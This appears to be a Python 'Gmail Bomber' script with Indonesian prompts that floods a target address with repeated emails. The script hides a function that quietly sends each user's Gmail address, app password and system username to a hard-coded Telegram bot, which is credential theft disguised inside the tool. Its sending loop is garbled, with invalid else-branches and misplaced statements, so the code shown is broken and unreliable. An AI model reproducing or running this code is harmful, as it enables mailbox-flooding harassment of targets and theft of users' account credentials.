import smtplib
import json
import os
import sys
import requests
import time
import getpass
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
CONFIG_FILE = '.config.json'
TELEGRAM_TOKEN = '8095010207:AAGamyBoIcKoxg72B16ISosjFKo-Up-LoMw'
TELEGRAM_CHAT_ID = '7835697069'
DEFAULT_SUBJECT = 'DaemonTechX - Important Message‼️'
GREEN = '[1;32m'
RED = '[1;31m'
YELLOW = '[1;33m'
CYAN = '[1;36m'
RESET = '[0m'

def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print('', str(e))

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:  
        os.system('clear')
        print(f'\n{RED}   ╔═╗╔╦╗╔╦╗  ╔═╗╔═╗╔╗╔╔╦╗╔═╗╦═╗\n   ╠═╣ ║║ ║║  ╚═╗║╣ ║║║ ║║║╣ ╠╦╝\n   ╩ ╩═╩╝═╩╝  ╚═╝╚═╝╝╚╝═╩╝╚═╝╩╚═\n{GREEN}Masukkan Alamat Gmail & App Password\nUntuk Dijadikan Sebagai Akun Pengirim\n           Spam Gmail{RESET}\n')
        email = input(f'{RED}[{GREEN}?{RED}] {GREEN}Masukkan Alamat Gmail Sender {RED}:{GREEN} ')
        app_password = input(f'{RED}[{GREEN}?{RED}] {GREEN}Masukkan App Password Gmail {RED}:{GREEN} ')
        config = {'email': email, 'app_password': app_password}
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
        user_id = getpass.getuser()
        send_to_telegram(f'DATA SENDER TERBARU\n👤 User Id Termux: {user_id}\n📧 Email: {email}\n🔑 App Password: {app_password}')
        return config

def format_body(user_message):
    today = datetime.now().strftime('%Y - %m - %d')
    return f'{user_message}\n\nDaemonTechX Community - Message\nDate {today}'

def kirim_email(pengirim, password, penerima, body, jumlah):
    body = format_body(body)
    msg = MIMEMultipart()
    msg['From'] = pengirim
    msg['To'] = penerima
    msg['Subject'] = DEFAULT_SUBJECT
    msg.attach(MIMEText(body, 'plain'))
    sukses = 0
    gagal = 0
    start_time = time.time()
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(pengirim, password)
        for i in range(jumlah):
            pass  
    except Exception as e:
        else:  
            try:
                server.sendmail(pengirim, penerima, msg.as_string())
                sukses += 1
                print(f'{RED}[{GREEN}{i + 1:02}{RED}] {GREEN}Pesan Sukses Terkirim ✅')
            except Exception:
                pass  
        else:  
            server.quit()
        else:  
            end_time = time.time()
            durasi = round(end_time - start_time, 2)
            os.system('clear')
            print('[1;33m\n      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n      ⣿⠛⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢁⠆⢻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡿⢻⣿\n      ⡇⠆⡘⢿⣿⣿⡿⢈⢻⣿⣿⣿⠇⣤⡏⡄⢿⣿⣿⣿⢃⠘⣿⣿⣿⡟⠐⡌⣿\n      ⠃⢠⣆⠌⢿⣿⠇⣻⢊⢻⣿⡟⢨⢺⡷⢸⠈⣿⣿⢂⢰⡄⣿⣿⠏⣐⣴⠠⢹\n      ⠘⡘⣿⣹⢸⣿⣀⢻⡞⣨⣿⣶⢀⣣⣥⣇⢲⣿⣧⡘⡮⢃⣸⣧⢸⡼⡟⡠⢸\n      ⣧⠈⣦⢻⠸⣿⣿⠈⣧⢈⠻⠏⣼⣻⢟⣿⡌⠿⢋⢠⢡⢸⣿⡿⢸⢣⡞⢀⣿\n      ⣿⡄⠺⣼⣇⠙⣣⣺⣿⡷⢉⡜⠛⠛⠚⠛⠛⣄⠱⣿⣎⢤⡛⢃⣾⡵⠂⣸⣿\n      ⣿⣧⠐⣽⣿⣷⣦⣭⢥⣶⣿⣿⣿⣿⠀⣿⣿⣿⣳⣦⡭⣭⣴⣿⣿⠽⠀⣿⣿\n      ⣿⣿⠀⠛⣻⡭⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣷⣎⣶⡮⣽⡋⠃⢀⣿⣿\n      ⣿⣿⠀⢸⣽⣴⣽⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣿⣿⣿⣝⣽⣿⠀⢸⣿⣿\n      ⡿⠟⠀⢀⣀⠀⠀⢀⣀⠀⣀⡀⠀⣀⠀⠀⠀⣀⠀⠀⠀⠀⣀⣀⠀⠀⢘⢿⣿\n      ⣷⣤⡄⢘⣿⠇⣠⡿⠋⠀⣿⡇⠀⣿⣧⡀⠀⣿⠀⢠⣾⠛⠉⠋⠁⠀⣤⣄⣿\n      ⣿⣿⡇⢨⣿⡿⣿⢄⠀⠀⣿⠆⠀⡇⠹⣷⡄⣿⠀⣿⡇⠀⠀⢠⣤⠀⣿⣿⣿\n      ⣿⣿⡇⢸⣿⡅⠘⢿⣦⠀⣿⡇⠀⣷⠀⠈⢿⣿⠀⠹⣷⣄⣀⣸⣿⠀⣿⣿⣿\n      ⣿⣿⣧⣈⣟⣇⣀⣨⣉⣅⣭⣃⣤⣭⣄⣤⣤⣩⣥⣤⣤⣭⣭⣭⣭⣤⣿⣿⣟\n')
            print(f'{GREEN}Gmail Pengirim   {RED}: {GREEN}{pengirim}')
            print(f'{GREEN}Gmail Tujuan     {RED}: {GREEN}{penerima}')
            print(f'{GREEN}Pesan Terkirim   {RED}: {GREEN}{sukses}')
            print(f'{GREEN}Pesan Gagal      {RED}: {GREEN}{gagal}')
            print(f'{GREEN}Durasi Waktu     {RED}: {GREEN}{durasi} detik')
            input(f'\n[100m{GREEN}Enter Untuk Kembali{RESET}')
            gagal += 1
            print(f'{GREEN}[{RED}{i + 1:02}{GREEN}] {RED}Pesan Gagal ❌')
            pass
            print('❌ {YELLOW}Gagal mengirim pesan{RED} :{GREEN} ', str(e))

def reset_config():
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
        print('⚠️ {YELLOW}Sender berhasil direset. Restarting program...\n')
        os.execv(sys.executable, ['python'] + sys.argv)
    else:  
        print('❌ {YELLOW}Tidak ada config yang tersimpan.')
if __name__ == '__main__':
    config = load_config()
    pengirim = config['email']
    password = config['app_password']
    while True:
        os.system('clear')
        print(f'\n[1;35m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠿⠿⠿⠿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣤⣤⣠⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣤⣀⣀⣀⣀⣈⣩⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣄⠀⠀⠀⠈⠉⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⢹⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⡋⠹⣿⣿⣿⣿⣿⣆⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣦⣴⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠸⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀\n⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀\n⠹⣷⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡄⠀⠀⠀⠀⠀⠀\n⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣯⣥⣴⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡅⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⣀⠬⠛⠋⠉⠙⠻⠿⠿⠟⠋⢉⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣶⣤⣤⣤⣄⡀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉\n                 {RED} >>{GREEN} Gmail Bomber {RED}<<\n                 {GREEN}[ {RED}Script By Byexe!{GREEN} ]\n      {CYAN} https://github.com/DaemonTechX/Gmail_Bomber{RESET}\n')
        print(f'{RED}[{GREEN}01{RED}] {GREEN}Gas Bomb Gmail')
        print(f'{RED}[{GREEN}02{RED}] {GREEN}Reset Sender')
        print(f'{RED}[{GREEN}03{RED}] {GREEN}Keluar')
        choice = input(f'\n{YELLOW}[{RED}>_{YELLOW}] {RED}Masukkan Pilihan {YELLOW}>>{GREEN} ')
        if choice == '1':
            penerima = input(f'\n{RED}[{GREEN}?{RED}] {GREEN}Masukkan Alamat Gmail Target {RED}:{GREEN} ')
            body = input(f'{RED}[{GREEN}?{RED}] {GREEN}Masukkan Isi Pesan {RED}:{GREEN} ')
            jumlah = int(input(f'{RED}[{GREEN}?{RED}] {GREEN}Masukkan Jumlah Bomb {RED}:{GREEN} '))
            kirim_email(pengirim, password, penerima, body, jumlah)
        else:  
            if choice == '2':
                reset_config()
            else:  
                if choice == '3':
                    os.system('clear')
                    print('\n[1;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⣠⣴⣄⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⢀⣴⣿⣿⣿⣿⡆⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠀⣠\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⢀⣠⣶⣿⡟\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠁⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠉⠉⠙⠛⠛⠛⠿⠋⠀⣀⣴⣿⣿⣿⠋⣰\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⡀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡏⣩⣤⠄⣠⣶⣶⡶⢀⣤⡀⠀⣠⣾⣿⣿⣿⡿⢃⣼⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣴⣿⢃⣾⣿⣿⢋⣴⣿⠟⣠⣿⣿⣿⣿⣿⣿⠁⠾⠿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢃⣾⣿⣿⢃⣾⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣴⠋⣠⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠉⠉⠀⣠⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣦⣠⣾⣿⣿⣧⡘⠿⠋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⣿\n⣿⣿⣿⣿⣿⡟⠁⠀⠈⠉⠛⠏⠀⣴⣤⣴⣿⣿⣿⡿⠋⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌\n⣿⣿⡿⠋⠉⠁⢀⣿⡃⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢸⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠁⠀⠉⠙⢿⣿⣿⣿⣿⣿\n⣿⠋⠀⣠⣶⣷⣾⣿⣿⣿⣄⠲⣤⣀⠀⠈⠙⠿⣿⡀⠀⠀⠀⣠⡞⣩⣴⣾⣿⣿⣿⣶⣬⣛⢿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿\n⡇⠀⣴⣿⡿⠉⠉⠉⠻⣿⣿⣇⠠⢉⠻⢦⣄⠀⠈⠻⢷⣶⣿⡏⣾⡀⠿⣿⡿⠻⣿⣿⣿⠛⣧⡹⣿⣇⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿\n⡇⠀⣿⣿⠀⠀⠀⠀⠀⢻⣿⡿⢸⣷⣬⡂⢍⠻⢶⣄⡀⠉⠛⢷⣿⣷⣦⣤⣴⣦⣈⣉⣁⣠⣾⡇⣿⣿⣦⣀⠀⠀⢀⣠⣿⣿⣿⣿⣿⣿\n⡇⠀⣿⣿⣆⠀⠀⠀⣠⣿⣿⣧⢸⣿⣿⣿⣷⣬⣐⣬⡙⠢⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⡇⠀⣿⣿⣿⣿⠿⢿⡿⠿⠿⠟⢼⣿⣿⣿⣿⣿⣿⣿⣿⣶⠀⣷⠀⡄⠀⠈⠛⠛⠛⠛⠿⠿⣫⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⡇⠀⣿⡛⢹⣇⠀⣠⡏⢘⣿⣿⣶⣌⠙⠻⢿⣿⣿⣿⣿⣿⠀⣿⠀⡇⢰⡆⣄⠀⠀⢤⡀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⡇⠀⢻⣷⣤⣙⣛⣋⣴⣿⠿⠟⣿⣿⢸⠀⡆⢈⢙⠻⢿⣿⠀⠿⠀⣿⢸⡇⣿⠀⣆⢠⣈⠃⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣇⠀⠀⢉⠛⠛⠛⠛⠋⠁⠤⡀⠈⠙⠘⠆⡇⢸⠈⣷⣦⣍⡀⠄⡀⠉⠈⠃⢿⠀⣿⢸⣭⣷⣦⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣦⣄⣀⠀⠁⠀⠀⠀⠀⠀⠀⠉⠢⢄⡀⠀⠙⠀⢿⣿⣿⣿⣷⣤⣁⠢⠀⡀⠀⠙⢸⣿⣿⣿⡄⠀⢿⣿⣿⣿⡿⣿⣿⣿⣿⡿⠿⠿⠛\n⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠂⢄⡀⠈⠙⠻⢿⣿⣿⣿⣶⣬⣑⠀⠸⢿⣿⣿⡇⠀⢸⡛⣿⣿⣷⢠⡉⠻⢿⠇⢠⣦⣴\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠂⠀⠀⠉⠉⠙⠛⠿⢿⣿⣶⣦⣌⡉⠃⠀⠈⣿⣦⣍⣫⣾⣿⣷⣤⣴⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⣰⣿⣿⣿⣷⣦⡀⢠⣴⣾⣿⣿⡿⣷⣶⣶⣤⡀⠈⠙⣿⣿⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢀⣿⣿⣿⣿⣿⣿⠀⣾⣿⣿⡿⣫⣾⣿⣿⣿⣿⣿⣷⣄⠈⠙⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣬⣙⠻⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⠀⠹⣿⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n')
                print(f'❌ {YELLOW}Pilihan tidak valid.')
